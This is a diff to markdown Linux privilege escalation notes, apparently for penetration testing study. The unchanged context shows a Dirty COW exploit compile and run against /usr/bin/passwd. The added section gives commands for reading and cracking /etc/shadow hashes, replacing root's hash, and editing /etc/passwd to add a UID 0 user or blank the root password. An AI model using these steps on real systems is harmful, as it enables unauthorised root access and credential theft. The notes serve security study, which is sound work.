@@ -34,7 +34,6 @@ Files & Directories
   - Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
   - Read – when set, the directory contents can be listed.
   - Write – when set, files and subdirectories can be created in the directory.
-
 - Special Permissions
   - SUID: When set, files will get executed with the privileges of the file owner.
   - SGID: When set on a file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.
@@ -59,9 +58,23 @@ gcc -pthread c0w.c -o c0w
 ./c0w
 /usr/bin/passwd
 ```
-
-
-
+## Weak File Permissions
+- Readable /etc/shadow:
+  - cat /etc/shadow (copy password hash found between the first and second colons : to file)
+  - john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+- Writable /etc/shadow:
+  - mkpasswd -m sha-512 newpasswordhere
+  - Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+- Writable /etc/passwd 
+  - if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.
+    - root:x:0:0:root:/root:/bin/bash
+    - The “x” instructs Linux to look for the password hash in the /etc/shadow file
+    - openssl passwd "password"
+    - root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+  - Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
+    - newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+  - In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password
+    - root::0:0:root:/root:/bin/bash
 
 
 
